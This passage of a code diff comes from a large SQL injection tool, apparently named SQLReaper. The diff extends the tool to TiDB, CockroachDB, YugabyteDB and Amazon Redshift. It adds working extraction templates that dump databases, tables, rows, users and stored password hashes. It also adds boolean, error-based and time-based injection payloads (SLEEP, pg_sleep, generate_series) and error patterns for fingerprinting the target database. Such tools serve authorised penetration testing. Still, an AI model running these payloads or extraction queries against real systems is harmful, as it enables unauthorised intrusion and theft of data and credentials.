+                       " FROM information_schema.tables"
+                       " WHERE table_schema NOT IN ('pg_catalog','information_schema','crdb_internal')"
+                       " AND table_type='BASE TABLE'"),
+            "columns": ("SELECT string_agg(column_name,',' ORDER BY ordinal_position)"
+                        " FROM information_schema.columns"
+                        " WHERE table_schema=current_schema() AND table_name='{table}'"),
+            "count":        'SELECT COUNT(*) FROM "{db}"."{table}"',
+            "row":          'SELECT {cols} FROM "{db}"."{table}" LIMIT 1 OFFSET {offset}',
+            "users":        "SELECT string_agg(usename,',') FROM pg_user",
+            "passwords":    "SELECT string_agg(rolname||':'||COALESCE(options::text,'[null]'),'|') FROM pg_catalog.pg_roles WHERE rolcanlogin",
+            # CockroachDB uses PG-compatible ASCII/SUBSTRING FROM/FOR syntax
+            "char_func":     "COALESCE(ASCII(SUBSTRING(({query}) FROM {pos} FOR 1)),0)",
+            "char_func_hex": "ENCODE(SUBSTRING(({query}) FROM {pos} FOR 1)::bytea,'hex')",
+            "substr":        "SUBSTRING(({query}) FROM {pos} FOR 1)",
+            "len_func":      "COALESCE(CHAR_LENGTH(({query})),0)",
+            "if_func":       "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
+            "privileges":    "SELECT string_agg(privilege_type,',') FROM information_schema.role_table_grants WHERE grantee=current_user",
+            "null_to_empty": "COALESCE(({query}),'')",
+        },
+        # YugabyteDB: PG-wire-compatible; use PG-standard templates with YB-specific version.
+        "YugabyteDB": {
+            "version":      "SELECT yb_server_version()",
+            "current_db":   "SELECT current_database()",
+            "current_user": "SELECT current_user",
+            "hostname":     "SELECT 'N/A'",
+            "dbs": ("SELECT string_agg(datname,',' ORDER BY datname)"
+                    " FROM pg_database WHERE datistemplate=false AND datallowconn=true"),
+            "tables": ("SELECT string_agg(table_name,',' ORDER BY table_name)"
+                       " FROM information_schema.tables"
+                       " WHERE table_schema NOT IN ('pg_catalog','information_schema')"
+                       " AND table_type='BASE TABLE'"),
+            "columns": ("SELECT string_agg(column_name,',' ORDER BY ordinal_position)"
+                        " FROM information_schema.columns"
+                        " WHERE table_schema=current_schema() AND table_name='{table}'"),
+            "count":        'SELECT COUNT(*) FROM "{db}"."{table}"',
+            "row":          'SELECT {cols} FROM "{db}"."{table}" LIMIT 1 OFFSET {offset}',
+            "users":        "SELECT string_agg(usename,',') FROM pg_user",
+            "passwords":    "SELECT string_agg(rolname||':'||COALESCE(rolpassword,'[null]'),'|') FROM pg_authid WHERE rolpassword IS NOT NULL",
+            # YugabyteDB uses PG-compatible ASCII/SUBSTRING FROM/FOR syntax
+            "char_func":     "COALESCE(ASCII(SUBSTRING(({query}) FROM {pos} FOR 1)),0)",
+            "char_func_hex": "ENCODE(SUBSTRING(({query}) FROM {pos} FOR 1)::bytea,'hex')",
+            "substr":        "SUBSTRING(({query}) FROM {pos} FOR 1)",
+            "len_func":      "COALESCE(CHAR_LENGTH(({query})),0)",
+            "if_func":       "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
+            "privileges":    "SELECT string_agg(privilege_type,',') FROM information_schema.role_table_grants WHERE grantee=current_user",
+            "null_to_empty": "COALESCE(({query}),'')",
+        },
+        # Amazon Redshift: PG-wire-compatible (PG 8.0.2 base) with Redshift extensions.
+        # Key differences from standard PG:
+        #   SUBSTRING uses comma-syntax (pos, len) not FROM/FOR (both are accepted but
+        #   comma-syntax avoids potential driver version mismatch).
+        #   No ENCODE(bytea,'hex') — use TO_HEX() for integer conversion.
+        #   string_agg available; LISTAGG also available (Redshift's native aggregation).
+        #   pg_database, information_schema.tables, information_schema.columns all work.
+        "Amazon Redshift": {
+            "version":      "SELECT version()",
+            "current_db":   "SELECT current_database()",
+            "current_user": "SELECT current_user",
+            "hostname":     "SELECT 'N/A'",
+            "dbs": ("SELECT LISTAGG(datname,',') WITHIN GROUP (ORDER BY datname)"
+                    " FROM pg_database WHERE datistemplate=FALSE AND datallowconn=TRUE"),
+            "tables": ("SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name)"
+                       " FROM information_schema.tables"
+                       " WHERE table_schema NOT IN ('pg_catalog','information_schema')"
+                       " AND table_type='BASE TABLE'"),
+            "columns": ("SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY ordinal_position)"
+                        " FROM information_schema.columns"
+                        " WHERE table_schema=current_schema AND table_name='{table}'"),
+            "count":        'SELECT COUNT(*) FROM "{db}"."{table}"',
+            "row":          'SELECT {cols} FROM "{db}"."{table}" LIMIT 1 OFFSET {offset}',
+            "users":        "SELECT LISTAGG(usename,',') WITHIN GROUP (ORDER BY usename) FROM pg_user",
+            "passwords":    "SELECT 'N/A (Redshift uses IAM authentication)'",
+            # Redshift uses comma-syntax SUBSTRING; ASCII for single-byte, CHAR_LENGTH for length
+            "char_func":     "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
+            "char_func_hex": "LOWER(TO_HEX(COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)))",
+            "substr":        "SUBSTRING(({query}),{pos},1)",
+            "len_func":      "COALESCE(CHAR_LENGTH(({query})),0)",
+            "if_func":       "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
+            "privileges":    "SELECT LISTAGG(privilege_type,',') WITHIN GROUP (ORDER BY privilege_type) FROM information_schema.role_table_grants WHERE grantee=current_user",
             "null_to_empty": "COALESCE(({query}),'')",
         },
         # BUG-V176-SYBASE-MISSING-DBMS-QUERIES-ENTRY FIX (HIGH; all extraction engines;
@@ -107094,9 +108297,10 @@ DBMS_QUERIES_JSON_XML = _NormalizingDBMSDict(DBMS_QUERIES_JSON_XML)
 
 DBMS_PROBE_ORDER = [
     "MySQL", "PostgreSQL", "MSSQL", "SQLite", "Oracle", "MariaDB",
+    "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift",  # BUG-PROBEORDER-NEWDBMS FIX: wire-compatible engines must appear in probe order so their detection payloads are dispatched during blind scanning
     # Removed: Generic (redundant  DBMS-specific payloads already cover all basic patterns)
     # Removed: DB2, Sybase, Firebird, H2, ClickHouse, HSQLDB, SAP_HANA,
-    # Ingres, CockroachDB, Amazon Redshift (<1% of web apps combined)
+    # Ingres (<1% of web apps combined)
 ]
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -107826,7 +109030,13 @@ def _build_technique_map() -> dict:
         "SO",                        # BUG-2A FIX: SO was missing
         "UH"                         # BUG-2B FIX: UH (Union-Header) was missing
     ]
-    for d in ["MySQL", "MariaDB", "PostgreSQL", "MSSQL", "SQLite", "Oracle"]:
+    # BUG-BTM-TIDB FIX: TiDB was missing from _build_technique_map() DBMS list.
+    # DBMS_TECHNIQUE_MAP had no "TiDB" entry → DBMS_TECHNIQUE_MAP.get("TiDB") → None
+    # → cascade fell through with empty payload list even after DBMS was identified as TiDB.
+    # With 'tidb' → 'MYSQL' now in _GDBT_DBMS_MAP, _get_cascade_payloads("TiDB", tech)
+    # correctly returns MySQL payloads. Adding TiDB here materializes those payloads into
+    # the technique map so the cascade engine can serve them without calling get_dbms_payloads.
+    for d in ["MySQL", "MariaDB", "TiDB", "PostgreSQL", "MSSQL", "SQLite", "Oracle"]:
         entry = {}
         for t in _all_techs:
             _pls = _get_cascade_payloads(d, t, 5)   # BUG-CPU-BTM-DOUBLECALL FIX: compute once
@@ -109096,11 +110306,12 @@ class TechniqueCascadeEngine:
                 # → 'SQRCATCNQB' appears in response only if SQL executed.
                 # Literal string 'SQRCATCNQB' is never split, so WAF/reflection of
                 # the raw payload string cannot produce the merged sentinel.
-                if dbms in ("MySQL", "MariaDB"):
+                if dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-UNION-SENTINEL-TIDB FIX: TiDB uses CONCAT() like MySQL.
                     _concat = "CONCAT('SQRCA','TCNQB')"
                 elif dbms == "MSSQL":
                     _concat = "'SQRCA'+'TCNQB'"
-                else:  # PostgreSQL, Oracle, SQLite, Generic
+                else:  # PostgreSQL, Oracle, SQLite, CockroachDB, YugabyteDB, Redshift, Generic
                     _concat = "'SQRCA'||'TCNQB'"
 
                 # Column count from detection payload SELECT clause
@@ -112364,7 +113575,9 @@ class TechniqueCascadeEngine:
                     (f" AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table-num"),  # BUG-R3-D FIX
                 ]
             # BUG-R3-B FIX: add explicit PostgreSQL branch.
-            elif dbms == "PostgreSQL":
+            # BUG-CHECKC-PG-CRDB FIX: CockroachDB/YugabyteDB/Redshift are PG-wire-compatible;
+            # 1/0, CAST AS INTEGER, and ::integer cast all raise errors identically to PostgreSQL.
+            elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                 _c_fallbacks = [
                     ("' AND 1/0-- -", "division"),
                     (" AND 1/0-- -", "division-num"),      # BUG-R3-D FIX
@@ -112541,6 +113754,57 @@ class TechniqueCascadeEngine:
                     "truncated incorrect",
                     "incorrect integer value",
                     "incorrect decimal value",
+                ],
+                # BUG-CHECKC-TIDB-ERRPATTERNS FIX: TiDB is MySQL-wire-compatible and produces
+                # MySQL-format error messages. Without a TiDB key, the .get(dbms, [...]) fallback
+                # returns the union list which includes MySQL patterns, but explicitly mapping TiDB
+                # ensures Check C error matching is as precise as for MySQL — no ambiguous patterns
+                # from other DBMSes in the match set. TiDB-specific: error 1105 wraps internal
+                # errors and "tidb" appears in some error strings; EXTRACTVALUE/UPDATEXML produce
+                # the same XPATH syntax error as MySQL. CAST errors are MySQL-format error 1292.
+                "TiDB": [
+                    "you have an error in your sql syntax",
+                    "check the manual that corresponds to your tidb server version",
+                    "tidb server version", "tidb server",
+                    "error 1064", "error 1054", "error 1146", "error 1105",
+                    "sqlstate[hy000]", "sqlstate[42000]",
+                    "xpath syntax error",
+                    "updatexml(",
+                    "extractvalue(",
+                    "division by zero",
+                    "error 1292",
+                    "truncated incorrect",
+                    "incorrect integer value",
+                    "incorrect decimal value",
+                    "com.mysql.jdbc", "jdbc.mysql",  # TiDB uses MySQL JDBC driver
+                ],
+                # BUG-CHECKC-CRDB-ERRPATTERNS FIX: CockroachDB produces PostgreSQL-format errors.
+                # Without a CockroachDB key the fallback union list covers PG patterns but
+                # CockroachDB-specific strings ("pq: ", "crdb_internal") would be missed.
+                "CockroachDB": [
+                    "pq: ", "crdb_internal", "cockroach",
+                    "error:  division by zero", "error:  invalid input syntax",
+                    "error:  syntax error at or near", "error:  relation \"",
+                    "sqlstate: 22012", "sqlstate: 42601", "sqlstate: 42p01",
+                    "division by zero", "syntax error at or near", "invalid input syntax for type",
+                    "relation does not exist", "column does not exist",
+                ],
+                # BUG-CHECKC-YUGABYTE-ERRPATTERNS FIX: YugabyteDB produces PostgreSQL-format errors.
+                "YugabyteDB": [
+                    "error:  division by zero", "error:  invalid input syntax",
+                    "error:  syntax error at or near", "error:  relation \"",
+                    "sqlstate: 22012", "sqlstate: 42601", "sqlstate: 42p01",
+                    "division by zero", "syntax error at or near", "invalid input syntax for type",
+                    "relation does not exist", "column does not exist",
+                    "yugabyte", "ysql",
+                ],
+                # BUG-CHECKC-REDSHIFT-ERRPATTERNS FIX: Amazon Redshift produces PostgreSQL-format errors.
+                "Amazon Redshift": [
+                    "error:  division by zero", "error:  invalid input syntax",
+                    "error:  syntax error at or near", "error:  relation \"",
+                    "amazon redshift", "redshift",
+                    "division by zero", "syntax error at or near", "invalid input syntax for type",
+                    "relation does not exist", "column does not exist",
                 ],
             # FIX-CHECKC-UNKNOWN-DBMS: the old fallback contained only MySQL-format patterns.
             # When dbms="" (timing-first detection fires before DBMS fingerprinting),
@@ -113416,8 +114680,19 @@ class TechniqueCascadeEngine:
                     payloads = {
                         "MySQL":      " AND CHAR(83)=SUBSTRING('SQLReaper',1,1) AND LENGTH('SQLReaper')=9 AND 83=ASCII('S')-- -",
                         "MariaDB":    " AND CHAR(83)=SUBSTRING('SQLReaper',1,1) AND LENGTH('SQLReaper')=9 AND 83=ASCII('S')-- -",
+                        # BUG-CHECKE-TIDB-PAYLOAD FIX: TiDB was absent from Check E payload
+                        # dict → fell through to PostgreSQL default (SUBSTRING/LENGTH/UPPER).
+                        # TiDB is MySQL-wire-compatible: CHAR(), ASCII(), SUBSTRING(), LENGTH()
+                        # are all valid TiDB functions. Using the MySQL payload exercises
+                        # TiDB-specific function evaluation paths (CHAR() + ASCII()), producing
+                        # a stronger DBMS-consistency signal than the ANSI PostgreSQL fallback.
+                        "TiDB":       " AND CHAR(83)=SUBSTRING('SQLReaper',1,1) AND LENGTH('SQLReaper')=9 AND 83=ASCII('S')-- -",
                         "PostgreSQL": " AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "CockroachDB": " AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "YugabyteDB": " AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "Amazon Redshift": " AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "MSSQL":      " AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "Sybase":     " AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Oracle":     " AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "SQLite":     " AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                     }
@@ -113425,8 +114700,15 @@ class TechniqueCascadeEngine:
                     payloads = {
                         "MySQL":      "' AND CHAR(83)=SUBSTRING('SQLReaper',1,1) AND LENGTH('SQLReaper')=9 AND 83=ASCII('S')-- -",
                         "MariaDB":    "' AND CHAR(83)=SUBSTRING('SQLReaper',1,1) AND LENGTH('SQLReaper')=9 AND 83=ASCII('S')-- -",
+                        # BUG-CHECKE-TIDB-PAYLOAD FIX: TiDB absent from Check E payload dict.
+                        # TiDB is MySQL-wire-compatible — use MySQL payload for DBMS-specific probe.
+                        "TiDB":       "' AND CHAR(83)=SUBSTRING('SQLReaper',1,1) AND LENGTH('SQLReaper')=9 AND 83=ASCII('S')-- -",
                         "PostgreSQL": "' AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "CockroachDB": "' AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "YugabyteDB": "' AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "Amazon Redshift": "' AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "MSSQL":      "' AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "Sybase":     "' AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Oracle":     "' AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "SQLite":     "' AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                     }
@@ -115086,6 +116368,52 @@ class TechniqueCascadeEngine:
                  " AND (SELECT CASE WHEN SUBSTR('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END FROM dual)>=0-- -",
                  "SUBSTR+ALL_OBJECTS_HQ(numeric)"),
             ],
+            # BUG-O FIX (LOW-MEDIUM; CockroachDB/YugabyteDB/Amazon Redshift;
+            # Check B PCV _hq_bench_canaries; T/TH/HQ/BT techniques; all surfaces;
+            # all HTTP methods):
+            # CockroachDB, YugabyteDB, and Amazon Redshift were absent from
+            # _hq_bench_canaries. All three fell to the default fallback:
+            #   _hq_bench_canaries.get(dbms, _hq_bench_canaries.get("MySQL", []))
+            # → MySQL BENCHMARK(20000000,MD5('SQLReaper')) canaries.
+            # BENCHMARK() and IF() are MySQL-specific functions that do NOT EXIST
+            # in any PG-wire-compatible DBMS. When the canary loop fires these pairs:
+            #   CockroachDB/YugabyteDB/Amazon Redshift raise "function benchmark does
+            #   not exist" errors on BOTH the true and false probes. Both return error
+            #   pages with near-identical timing → timing gap ≈ 0 → canary pair rejected.
+            # 2 pairs × 2 probes each = 4 wasted HTTP probes before the correct
+            # pg_sleep canaries from _b_fallbacks_by_dbms are tried.
+            # On rate-limited or probe-budget-constrained targets, these 4 wasted
+            # probes can exhaust the per-PCV-run budget before the correct generate_series
+            # canaries are reached, causing Check B to fail silently and the confirmed
+            # injection to be discarded by PCV.
+            # Fix: add explicit entries using PostgreSQL's generate_series canaries.
+            # All three DBMSes are PostgreSQL-wire-compatible and support generate_series()
+            # identically to PostgreSQL. TiDB is intentionally not added here — it IS
+            # MySQL-wire-compatible and correctly falls back to MySQL's BENCHMARK canaries.
+            "CockroachDB": [
+                ("' AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "' AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "SUBSTRING+GENERATE_SERIES"),
+                (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "SUBSTRING+GENERATE_SERIES(numeric)"),
+            ],
+            "YugabyteDB": [
+                ("' AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "' AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "SUBSTRING+GENERATE_SERIES"),
+                (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "SUBSTRING+GENERATE_SERIES(numeric)"),
+            ],
+            "Amazon Redshift": [
+                ("' AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "' AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "SUBSTRING+GENERATE_SERIES"),
+                (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "SUBSTRING+GENERATE_SERIES(numeric)"),
+            ],
         }
 
         # BUG-CPU-4 FIX: Check _SCAN_STOPPED before building the large
@@ -115363,6 +116691,112 @@ class TechniqueCascadeEngine:
                  f"'; SELECT IF(SUBSTRING('SQLReaper',1,1)='X',SLEEP({_sleep_sec}),0)-- -", "STACKED+SUBSTRING+SLEEP"),
                 (f"'; SELECT IF(7*13=91,SLEEP({_sleep_sec}),0)-- -",
                  f"'; SELECT IF(7*13=92,SLEEP({_sleep_sec}),0)-- -", "STACKED+arithmetic+SLEEP"),
+            ],
+            # BUG-FALLBACK-TIDB-CHECKB FIX: TiDB was absent from _b_fallbacks_by_dbms →
+            # dbms="TiDB" fell to the else-branch (all-DBMS merge) which includes Oracle/MSSQL/SQLite
+            # canaries that are irrelevant for TiDB and inflate the canary list unnecessarily.
+            # TiDB is MySQL-wire-compatible: uses IF()/SLEEP() identically to MySQL.
+            # Explicit entry avoids the all-DBMS merge and ensures the correct (MySQL-equivalent)
+            # canary order: SUBSTRING→arithmetic→NULL, then stacked variants.
+            "TiDB": [
+                # ── String-context ────────────────────────────────────────────
+                (f"' AND IF(SUBSTRING('SQLReaper',1,1)='S',SLEEP({_sleep_sec}),1)-- -",
+                 f"' AND IF(SUBSTRING('SQLReaper',1,1)='X',SLEEP({_sleep_sec}),1)-- -", "SUBSTRING+SLEEP"),
+                (f"' AND IF(7*13=91,SLEEP({_sleep_sec}),1)-- -",
+                 f"' AND IF(7*13=92,SLEEP({_sleep_sec}),1)-- -", "arithmetic+SLEEP"),
+                (f"' AND IF(NULL IS NULL,SLEEP({_sleep_sec}),1)-- -",
+                 f"' AND IF(NULL=NULL,SLEEP({_sleep_sec}),1)-- -", "NULL+SLEEP"),
+                # ── Numeric-context (no leading quote — WHERE id=INPUT) ────────
+                (f" AND IF(SUBSTRING('SQLReaper',1,1)='S',SLEEP({_sleep_sec}),0)-- -",
+                 f" AND IF(SUBSTRING('SQLReaper',1,1)='X',SLEEP({_sleep_sec}),0)-- -", "SUBSTRING+SLEEP(numeric)"),
+                (f" AND IF(7*13=91,SLEEP({_sleep_sec}),0)-- -",
+                 f" AND IF(7*13=92,SLEEP({_sleep_sec}),0)-- -", "arithmetic+SLEEP(numeric)"),
+                (f" AND IF(NULL IS NULL,SLEEP({_sleep_sec}),0)-- -",
+                 f" AND IF(NULL IS NOT NULL,SLEEP({_sleep_sec}),0)-- -", "NULL+SLEEP(numeric)"),
+                # ── Stacked ───────────────────────────────────────────────────
+                (f"'; SELECT IF(SUBSTRING('SQLReaper',1,1)='S',SLEEP({_sleep_sec}),0)-- -",
+                 f"'; SELECT IF(SUBSTRING('SQLReaper',1,1)='X',SLEEP({_sleep_sec}),0)-- -", "STACKED+SUBSTRING+SLEEP"),
+                (f"'; SELECT IF(7*13=91,SLEEP({_sleep_sec}),0)-- -",
+                 f"'; SELECT IF(7*13=92,SLEEP({_sleep_sec}),0)-- -", "STACKED+arithmetic+SLEEP"),
+                (f"'; SELECT SLEEP(IF(SUBSTRING('SQLReaper',1,1)='S',{_sleep_sec},0))-- -",
+                 f"'; SELECT SLEEP(IF(SUBSTRING('SQLReaper',1,1)='X',{_sleep_sec},0))-- -", "STACKED+SLEEP-IF"),
+            ],
+            # BUG-K FIX: CockroachDB, YugabyteDB, Amazon Redshift were absent from
+            # _b_fallbacks_by_dbms → all three fell to the else-branch (all-DBMS merge)
+            # which includes Oracle DBMS_PIPE, MySQL IF/SLEEP, MSSQL WAITFOR, and
+            # SQLite RANDOMBLOB canaries — ALL invalid on PG-wire-compatible DBMSes.
+            # While the PG canaries were included via the PostgreSQL entry in the merge,
+            # the invalid Oracle/MySQL/MSSQL/SQLite pairs wasted HTTP probe budget and
+            # introduced false-signal risk on PG-wire targets where those functions raise
+            # syntax errors, making the false probe appear non-zero delay due to error
+            # handling overhead.
+            # Fix: add explicit entries with pg_sleep()-based canaries identical to
+            # the PostgreSQL entry.  All three are PostgreSQL-wire-compatible:
+            #   CockroachDB   — PG wire protocol, pg_sleep() supported natively
+            #   YugabyteDB    — PG wire protocol, pg_sleep() supported natively
+            #   Amazon Redshift — PG wire protocol, pg_sleep() supported natively
+            "CockroachDB": [
+                # ── String-context stacked ────────────────────────────────────
+                (f"'; SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN pg_sleep({_sleep_sec}) END-- -",
+                 f"'; SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN pg_sleep({_sleep_sec}) END-- -", "SUBSTRING+pg_sleep"),
+                (f"'; SELECT CASE WHEN 7*13=91 THEN pg_sleep({_sleep_sec}) END-- -",
+                 f"'; SELECT CASE WHEN 7*13=92 THEN pg_sleep({_sleep_sec}) END-- -", "arithmetic+pg_sleep"),
+                # ── Stacked ('; SELECT pg_sleep(...)) ─────────────────────────
+                (f"'; SELECT pg_sleep(CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN {_sleep_sec} ELSE 0 END)-- -",
+                 f"'; SELECT pg_sleep(CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN {_sleep_sec} ELSE 0 END)-- -", "STACKED+SUBSTRING+pg_sleep"),
+                (f"'; SELECT pg_sleep(CASE WHEN 7*13=91 THEN {_sleep_sec} ELSE 0 END)-- -",
+                 f"'; SELECT pg_sleep(CASE WHEN 7*13=92 THEN {_sleep_sec} ELSE 0 END)-- -", "STACKED+arithmetic+pg_sleep"),
+                # ── Numeric-context (AND-form, no leading quote) ───────────────
+                (f" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -",
+                 f" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -", "SUBSTRING+pg_sleep(numeric)"),
+                (f" AND (SELECT CASE WHEN 7*13=91 THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -",
+                 f" AND (SELECT CASE WHEN 7*13=92 THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -", "arithmetic+pg_sleep(numeric)"),
+                # ── Heavy-query fallback (CockroachDB supports generate_series) ─
+                (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -", "SUBSTRING+GENERATE_SERIES(numeric)"),
+            ],
+            "YugabyteDB": [
+                # ── String-context stacked ────────────────────────────────────
+                (f"'; SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN pg_sleep({_sleep_sec}) END-- -",
+                 f"'; SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN pg_sleep({_sleep_sec}) END-- -", "SUBSTRING+pg_sleep"),
+                (f"'; SELECT CASE WHEN 7*13=91 THEN pg_sleep({_sleep_sec}) END-- -",
+                 f"'; SELECT CASE WHEN 7*13=92 THEN pg_sleep({_sleep_sec}) END-- -", "arithmetic+pg_sleep"),
+                # ── Stacked ───────────────────────────────────────────────────
+                (f"'; SELECT pg_sleep(CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN {_sleep_sec} ELSE 0 END)-- -",
+                 f"'; SELECT pg_sleep(CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN {_sleep_sec} ELSE 0 END)-- -", "STACKED+SUBSTRING+pg_sleep"),
+                (f"'; SELECT pg_sleep(CASE WHEN 7*13=91 THEN {_sleep_sec} ELSE 0 END)-- -",
+                 f"'; SELECT pg_sleep(CASE WHEN 7*13=92 THEN {_sleep_sec} ELSE 0 END)-- -", "STACKED+arithmetic+pg_sleep"),
+                # ── Numeric-context ───────────────────────────────────────────
+                (f" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -",
+                 f" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -", "SUBSTRING+pg_sleep(numeric)"),
+                (f" AND (SELECT CASE WHEN 7*13=91 THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -",
+                 f" AND (SELECT CASE WHEN 7*13=92 THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -", "arithmetic+pg_sleep(numeric)"),
+                # ── Heavy-query fallback (YugabyteDB supports generate_series) ─
+                (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -", "SUBSTRING+GENERATE_SERIES(numeric)"),
+            ],
+            "Amazon Redshift": [
+                # ── String-context stacked ────────────────────────────────────
+                # Redshift supports pg_sleep() since engine version 1.0.12866 (2021).
+                # For older Redshift, the stacked form may fail silently — the arithmetic
+                # heavy-query fallback (generate_series) is the safety net.
+                (f"'; SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN pg_sleep({_sleep_sec}) END-- -",
+                 f"'; SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN pg_sleep({_sleep_sec}) END-- -", "SUBSTRING+pg_sleep"),
+                (f"'; SELECT CASE WHEN 7*13=91 THEN pg_sleep({_sleep_sec}) END-- -",
+                 f"'; SELECT CASE WHEN 7*13=92 THEN pg_sleep({_sleep_sec}) END-- -", "arithmetic+pg_sleep"),
+                # ── Stacked ───────────────────────────────────────────────────
+                (f"'; SELECT pg_sleep(CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN {_sleep_sec} ELSE 0 END)-- -",
